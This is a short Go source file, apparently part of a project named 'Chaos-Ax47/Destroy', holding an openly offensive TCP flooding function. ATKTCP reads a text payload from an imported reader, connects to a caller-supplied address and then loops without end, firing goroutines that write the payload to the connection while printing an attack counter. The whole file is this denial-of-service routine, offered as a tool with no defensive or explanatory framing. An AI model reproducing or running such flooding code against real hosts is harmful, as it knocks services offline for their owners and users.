package atk

import (
	Rd "Chaos-Ax47/Destroy/Chaos-Package"

	"fmt"
	"net"
)

func ATKTCP(arguments string) {
	var COn Rd.READER47
	e := COn.Starter()
	if e != nil {
		fmt.Println(e)
		return
	}
	TEXT, e := COn.GETSTRing()
	if e != nil {
		fmt.Println(e)
		return
	}
	c, err := net.Dial("tcp", arguments)
	if err != nil {
		fmt.Println(err)
		return
	}
	i := 1
	for {
		fmt.Printf("ATk %d\n", i)
		go fmt.Fprintf(c, TEXT+"\n")
		i++
	}
}
